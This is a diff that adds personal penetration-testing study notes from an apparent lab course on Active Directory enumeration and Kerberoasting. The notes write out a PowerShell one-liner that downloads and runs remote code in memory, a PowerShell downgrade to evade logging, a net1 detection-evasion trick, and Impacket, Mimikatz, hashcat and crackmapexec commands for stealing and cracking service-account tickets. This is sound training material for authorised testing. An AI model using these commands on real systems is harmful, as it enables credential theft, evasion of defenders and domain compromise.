@@ -1,4 +1,4 @@
-t JPT
+ett  JPT
 #Note taking tools
 		
 	Cherrytree	Visual Studio Code	Evernote
@@ -7542,655 +7542,1296 @@ text
 	ipconfig /all 						Prints out network adapter state and configurations
 	set %USERDOMAIN% 					Displays the domain name to which the host belongs (ran from CMD-prompt)
 	set %logonserver% 					Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)
-Basic Enumeration
+
+	> The commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command systeminfo. The systeminfo command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.
+
+* Harnessing PowerShell
+
+	> PowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.
+	> Let's look at a few of the ways PowerShell can help us.
+		- Cmd-Let 	Description
+		> Get-Module 	Lists available modules loaded for use.
+		> Get-ExecutionPolicy -List 	Will print the execution policy settings for each scope on a host.
+		> Set-ExecutionPolicy Bypass -Scope Process 	This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.
+		- Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 	With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.
+		- Get-ChildItem Env: | ft Key,Value 	Return environment values such as key paths, users, computer information, etc.
+		- powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>" 	This is a quick and easy way to download a file from the web using PowerShell and call it from memory.
+
+
+* We have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.
+	> Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.
+	> Downgrade Powershell
+		PS C:\htb> Get-host
+		PS C:\htb> powershell.exe -version 2
+		PS C:\htb> Get-host
+		PS C:\htb> get-module
+
+	> We can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the PowerShell Operational Log found under Applications and Services Logs > Microsoft > Windows > PowerShell > Operational. All commands executed in our session will log to this file. The Windows PowerShell log located at Applications and Services Logs > Windows PowerShell is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the Windows PowerShell log entries.
+	> With Script Block Logging enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command powershell.exe -version 2 within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.
+
+* Checking Defenses
+
+	> The next few commands utilize the netsh and sc utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.
+	> Firewall Checks
+		PS C:\htb> netsh advfirewall show allprofiles
+
+	> Windows Defender Check (from CMD.exe)
+
+		C:\htb> sc query windefend
+
+	> Above, we checked if Defender was running. Below we will check the statuss
+	jjjvand configuration settings with the Get-MpComputerStatus cmdlet in PowerShell.
+	> Get-MpComputerStatus
+		PS C:\htb> Get-MpComputerStatus
+
+	> Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.
+
+* Am I Alone?
+
+	> When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
+	> Get-MpComputerStatus
+		PS C:\htb> qwinsta
+
+	> Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.
+
+* Network Information
+	! Networking Commands 		Description
+	> arp -a 			Lists all known hosts stored in the arp table.
+	> ipconfig /all 		Prints out adapter settings for the host. We can figure out the network segment from here.
+	> route print 			Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
+	> netsh advfirewall show state 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
+
+	> Commands such as ipconfig /all and systeminfo show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. arp -a and route print will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning
+	> Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.
+
+* Windows Management Instrumentation (WMI)
+	> Windows Management Instrumentation (WMI) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.
+	> Quick WMI checks
+		! Command 										Description
+		- wmic qfe get Caption,Description,HotFixID,InstalledOn 				Prints the patch level and description of the Hotfixes applied
+		- wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List 	Displays basic host information to include any attributes within the list
+		- wmic process list /format:list 							A listing of all processes on host
+		- wmic ntdomain list /format:list 							Displays information about the Domain and Domain Controllers
+		- wmic useraccount list /format:list 							Displays information about all local accounts and any domain accounts that have logged into the device
+		- wmic group list /format:list 								Information about all local groups
+		- wmic sysaccount list /format:list 							Dumps information about any system accounts that are being used as service accounts.
+
+	> Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This cheatsheet(https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.
+		PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
+
+			Caption          Description      DnsForestName           DomainControllerAddress  DomainName
+			ACADEMY-EA-MS01  ACADEMY-EA-MS01
+			INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
+			LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
+			FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
+
+* Net Commands
+
+	> Net commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:
+
+    		- Local and domain users
+    		- Groups
+    		- Hosts
+    		- Specific users in groups
+    		- Domain Controllers
+    		- Password requirements
+
+	> We'll cover a few examples below. Keep in mind that net.exe commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as whoami, and net localgroup administrators, etc. This could be an obvious red flag to anyone monitoring the network heavily.
+	> Table of Useful Net Commands
+		Command 					Description
+		net accounts 					Information about password requirements
+		net accounts /domain 				Password and lockout policy
+		net group /domain 				Information about domain groups
+		net group "Domain Admins" /domain 		List users with domain admin privileges
+		net group "domain computers" /domain 		List of PCs connected to the domain
+		net group "Domain Controllers" /domain 		List PC accounts of domains controllers
+		net group <domain_group_name> /domain 		User that belongs to the group
+		net groups /domain 				List of domain groups
+		net localgroup 					All available groups
+		net localgroup administrators /domain 		List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
+		net localgroup Administrators 			Information about a group (admins)
+		net localgroup administrators [username] /add 	Add user to administrators
+		net share 					Check current shares
+		net user <ACCOUNT_NAME> /domain 		Get information about a user within the domain
+		net user /domain 				List all users of the domain
+		net user %username% 				Information about the current user
+		net use x: \computer\share 			Mount the share locally
+		net view 					Get a list of computers
+		net view /all /domain[:domainname] 		Shares on the domains
+		net view \computer /ALL 			List shares of a computer
+		net view /domain 				List of PCs of the domain
+
+
+	> Net Commands Trick
+		If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.
+
+* Dsquery
+
+	> Dsquery is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.
+	> Dsquery DLL
+	> All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, we will show the basic search function with dsquery and a few helpful search filters.
+	> 	Command				Description
+		Dsquery *			Finds objects in the active directory according to search criteria using an LDAP query.
+		Dsquery user			Finds the user objects in the active directory according to specified search criteria.
+		Dsquery computer		Finds the computers in the active directory according to specified search criteria.
+		Dsquery group			Finds the groups in the active directory according to specified search criteria.
+		Dsquery ou			Finds the organizational units (OUs) in the active directory according to specified search criteria.
+		Dsquery contact			Finds the contacts in the active directory that matches the specified search criteria.
+		Dsquery site			Finds the sites in the active directory that matches the specified search criteria.
+		Dsquery server			Finds the domain controllers in the active directory according to specified search criteria.
+		Dsquery quota			Finds the quota specifications in the active directory that matches the specified search criteria. 
+						A quota specification determines the maximum number of directory objects a specified security principal
+						owns in a given directory partition.
+		Dsquery partition		Finds the partition objects in the active directory that matches the specified search criteria.
+
+
+	> El comando dsget funciona mediante el DN de los objetos 
+	> Se puede combinar dsquery con dsget 
+		dsquery user -name P* | dsget user -samid -display
+	> We can use a dsquery wildcard search to view all objects in an OU, for example.
+	> Wildcard Search
+		PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+
+	> We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.
+	> Users With Specific Attributes Set (PASSWD_NOTREQD)
+		PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+
+	> Another example querying for detailed information about a user 
+		dsquery * -filter "(objectclass=user)" -attr * -limit 1
+	> The below search filter looks for all Domain Controllers in the current domain, limiting to five results.
+	> Searching for Domain Controllers
+		PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+	> A compound filter will look like these:
+		- Here the & indicates that it is a compound filter, and any results must have both values for the corresponding attribute. With the ! symbol you can exclude items in your filters, but be sure to wrap it in a set of parenthesis. You can also exclude some results like this:
+			“(&(attribute1=value1)(attribute2=value2))”
+		- This filter will produce a list of results where the objects have value1 for attribute1 but do not have value2 for attribute2. These filters will work the same between dsquery and ldapsearch. Depending on what command line utility you are using, you may have difficulty with the ! symbol.
+		 	“(&(attribute1=value1)(!(attribute2=value2)))”
+	> Using filters 
+		PS C:\Tools> dsquery * -filter "(&(objectclass=computer)(name=*win*))" -attr name description -d 172.16.5.5
+		PS C:\Tools> dsquery * -filter "(objectclass=user)" -attr name description -d 172.16.5.5
+	> PasswordLast Set 
+		- Password Last Set: The pwdLastSet attribute may help you when you are looking for accounts to target. Service accounts sometimes have older and more simple passwords because they are needed for specific functions and changing them can be difficult depending on what they are used for. This can also be a quick check during an assessment to see if the organization’s password policy is properly implemented.
+			PS C:\Windows\system32> dsquery * -filter "(objectclass=user)" -attr name pwdlastset -d 172.16.5.5
+			PS C:\Windows\system32> w32tm.exe /ntte 132798298291720078
+		//Filtering for less time than pwdlastset administrator
+			PS C:\Windows\system32> dsquery * -filter "(&(objectclass=user)(pwdlastset<=132798197726313370))" -attr name pwdlastest -d 172.16.5.5
+		dsquery * -filter “(&(memberof=CN=Staff,DC=PLANETEXPRESS,DC=LOCAl)(memberof=CN=ShipCrew,DC=PLANETEXPRESS,DC=LOCAL))” -attr name memberof -d 192.168.88.195
+	> Options
+		-attr *
+		-d //domain by FQDN or IP 
+		-u -p // Username and password to use for querying AD
+
+* LDAP Filtering Explained
+
+	> You will notice in the queries above that we are using strings such as userAccountControl:1.2.840.113556.1.4.803:=8192. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:
+	> userAccountControl:1.2.840.113556.1.4.803: Specifies that we are looking at the User Account Control (UAC) attributes for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as Object Identifiers (OIDs ==> https://ldap.com/ldap-oid-reference-guide/).
+	> =8192 represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like password is not required or account is locked is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.
+	> UAC Values
+		(https://academy.hackthebox.com/storage/modules/143/UAC-values.png)
+
+* OID match strings
+	> OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
+	     1.2.840.113556.1.4.803
+	> When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
+	     1.2.840.113556.1.4.804
+	> When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
+	     1.2.840.113556.1.4.1941
+
+	> This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.
+
+* Logical Operators
+	> When building out search strings, we can utilize logical operators to combine values for the search. The operators & | and ! are used for this purpose. For example we can combine multiple search criteria with the & (and) operator like so:
+	> (&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
+	> The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like (&(1) (2) (3)). The ! (not) and | (or) operators can work similarly. For example, our filter above can be modified as follows:
+	> (&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))
+	> This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
+
+-==-=
+[+] Kerberoasting - from Linux
+
+Our enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names. Let's see how we can leverage this to move laterally and escalate privileges in the target domain.
+* Kerberoasting Overview
+	> Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
+	> Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.
+	> Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.
+	> For an interesting look at the origin of this technique, check out the talk Tim Medin(https://www.youtube.com/watch?v=PUyhlN-E5MU) gave at Derbycon 2014, showcasing Kerberoasting to the world.
+
+* Kerberoasting - Performing the Attack
+
+	> Depending on your position in a network, this attack can be performed in multiple ways:
+
+    		- From a non-domain joined Linux host using valid domain user credentials.
+    		- From a domain-joined Linux host as root after retrieving the keytab file.
+    		- From a domain-joined Windows host authenticated as a domain user.
+    		- From a domain-joined Windows host with a shell in the context of a domain account.
+    		- As SYSTEM on a domain-joined Windows host.
+    		- From a non-domain joined Windows host using runas /netonly.
+
+	> Several tools can be utilized to perform the attack:
+
+    		- Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
+    		- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
+    		- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.
+
+	> Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.
+
+* Efficacy of the Attack
+
+	> While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access. We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access. I would likely write up the finding as high-risk in my report in the first two cases. In the third case, we may Kerberoast and end up unable to crack a single TGS ticket, even after days of cracking attempts with Hashcat on a powerful GPU password cracking rig. In this scenario, I would still write up the finding, but I would drop it down to a medium-risk issue to make the client aware of the risk of SPNs in the domain (these strong passwords could always be changed to something weaker or a very determined attacker may be able to crack the tickets using Hashcat), but take into account the fact that I was unable to take control of any domain accounts using the attack. It is vital to make these types of distinctions in our reports and know when it's ok to lower the risk of a finding when mitigating controls (such as very strong passwords) are in place.
+
+* Performing the Attack
+
+	> Kerberoasting attacks are easily done now using automated tools and scripts. We will cover performing this attack in various ways, both from a Linux and a Windows attack host. Let's first go through how to do this from a Linux host. The following section will walk through a "semi-manual" way of performing the attack and two quick, automated attacks using common open-source tools, all from a Windows attack host.
+	> Kerberoasting with GetUserSPNs.py
+	> A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.
+	> Let's start by installing the Impacket toolkit, which we can grab from Here(https://github.com/SecureAuthCorp/impacket). After cloning the repository, we can cd into the directory and install it as follows:
+	> Installing Impacket using Pip
+		m1l0js@htb[/htb]$ sudo python3 -m pip install .
+
+	> This will install all Impacket tools and place them in our PATH so we can call them from any directory on our attack host. Impacket is already installed on the attack host that we can spawn at the end of this section to follow along and work through the exercises. Running the tool with the -h flag will bring up the help menu.
+	> We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.
+	> Listing SPN Accounts with GetUserSPNs.py
+		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+	> We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
+	> Requesting all TGS Tickets
+		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+
+	> We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
+	> Requesting a Single TGS ticket
+		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+	> With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.
+	> To facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.
+	> Saving the TGS Ticket to an Output File
+		m1l0js@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+
+	> Here we've written the TGS ticket for the sqldev user to a file named sqldev_tgs. Now we can attempt to crack the ticket offline using Hashcat hash mode 13100.
+	> Cracking the Ticket Offline with Hashcat
+		m1l0js@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
+
+	> We've successfully cracked the user's password as database!. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.
+	> Testing Authentication against a Domain Controller
+		m1l0js@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+
+[+] Kerberoasting - from Windows
+
+
+
+
+
+* Kerberoasting - Semi Manual method
+	> Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in setspn binary to enumerate SPNs in the domain.
+	> Enumerating SPNs with setspn.exe
+		C:\htb> setspn.exe -Q */*
+
+	> We will notice many different SPNs returned for the various hosts in the domain. We will focus on user accounts and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz. Let's try this by targeting a single user:
+	> Targeting a Single User
+		PS C:\htb> Add-Type -AssemblyName System.IdentityModel
+		PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+
+			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
+			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+			ValidFrom            : 2/24/2022 11:36:22 PM
+			ValidTo              : 2/25/2022 8:55:25 AM
+		ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+	> Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):
+
+    		- The Add-Type cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
+    		- The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
+    		- System.IdentityModel is a namespace that contains different classes for building security token services
+    		- We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
+    		- We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session
+
+	> We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.
+	> Retrieving All Tickets Using setspn.exe
+		PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+
+			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
+			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+			ValidFrom            : 2/24/2022 11:56:18 PM
+			ValidTo              : 2/25/2022 8:55:25 AM
+			ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
+			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+			
+			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
+			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+			ValidFrom            : 2/24/2022 11:56:18 PM
+			ValidTo              : 2/24/2022 11:58:18 PM
+			ServicePrincipalName : kadmin/changepw
+			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+			
+			Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
+			SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+			ValidFrom            : 2/24/2022 11:56:18 PM
+			ValidTo              : 2/25/2022 8:55:25 AM
+			ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
+			SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+
+	> The above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.
+	> Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.
+
+* Extracting Tickets from Memory with Mimikatz
+	> Retrieving All Tickets Using setspn.exe
+		mimikatz # base64 /out:true
+		mimikatz # kerberos::list /export  
+
+	> If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.
+	> Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.
+	> Preparing the Base64 Blob for Cracking
+		m1l0js@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
+
+	> We can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility.
+	> Placing the Output into a File as .kirbi
+		m1l0js@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
+
+	> Next, we can use this(https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the kirbi2john.py tool to extract the Kerberos ticket from the TGS file.
+	> Extracting the Kerberos Ticket using kirbi2john.py
+		m1l0js@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
+
+	> This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
+	> Modifiying crack_file for Hashcat
+		m1l0js@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+
+	> Now we can check and confirm that we have a hash that can be fed to Hashcat.
+	> Viewing the Prepared Hash
+		m1l0js@htb[/htb]$ cat sqldev_tgs_hashcat 
+
+	> We can then run the ticket through Hashcat again and get the cleartext password database!.
+	> Cracking the Hash with Hashcat
+		m1l0js@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+
+	> If we decide to skip the base64 output with Mimikatz and type mimikatz # kerberos::list /export, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.
+	> Now that we have seen the older, more manual way to perform Kerberoasting from a Windows machine and offline processing, let's look at some quicker ways. Most assessments are time-boxed, and we often need to work as quickly and efficiently as possible, so the above method will likely not be our go-to every time. That being said, it can be useful for us to have other tricks up our sleeves and methodologies in case our automated tools fail or are blocked.
+
+* Automated / Tool Based Route
+	> Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use PowerView to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.
+	> Using PowerView to Extract TGS Tickets
+		PS C:\htb> Import-Module .\PowerView.ps1
+		PS C:\htb> Get-DomainUser * -spn | select samaccountname
+
+	> From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
+	> Using PowerView to Target a Specific User
+		PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+	> Finally, we can export all tickets to a CSV file for offline processing.
+	> Exporting All Tickets to a CSV File
+		PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+	> Viewing the Contents of the .CSV File
+		PS C:\htb> cat .\ilfreight_tgs.csv
+
+	> We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
+	> Using Rubeus
+		PS C:\htb> .\Rubeus.exe
+
+	> As we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos, most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks. It is worth scrolling through the menu, familiarizing yourself with the options, and reading up on the various other possible tasks. Some options include:
+
+    		- Performing Kerberoasting and outputting hashes to a file
+    		- Using alternate credentials
+    		- Performing Kerberoasting combined with a pass-the-ticket attack
+    		- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
+    		- Requesting tickets for accounts passwords set between a specific date range
